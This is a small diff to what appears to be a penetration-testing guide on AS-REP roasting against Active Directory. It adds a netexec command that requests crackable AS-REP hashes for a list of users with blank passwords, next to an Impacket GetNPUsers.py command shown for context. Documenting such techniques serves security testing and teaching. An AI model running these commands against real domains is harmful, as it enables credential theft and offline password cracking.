@@ -33,6 +33,10 @@ GetNPUsers.py -request -dc-ip <dc-ip> <domain>/<user>
 
 - The KDC returns a **TGT encrypted with the user’s password**.
 
+You can also use the **netexec** command:
+```bash
+nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>
+```
 
 
 #### Step 3: Extract and Save Hash
